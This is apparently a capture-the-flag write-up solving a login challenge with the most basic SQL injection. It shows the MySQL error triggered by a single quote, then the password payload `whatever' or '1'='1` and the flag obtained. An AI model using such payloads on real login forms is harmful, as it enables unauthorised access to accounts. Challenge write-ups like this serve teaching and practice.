# Most basic SQLi pattern

## Solution

We use the most basic [SQL injection](https://www.owasp.org/index.php/SQL_Injection). We try to put both double and single quote in username and password. When putting a single quote in the password field we receive the following message:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'rr'' at line 1
```

Single quote are not escaped. We are able to log using as a password `whatever' or '1'='1`

|Field  | Value |
| ------------- | ------------- |
|username|/* Any value, does not matter */|
|password|whatever' or '1'='1|

And we obtain the Flag `FLAG-238974289383274893`
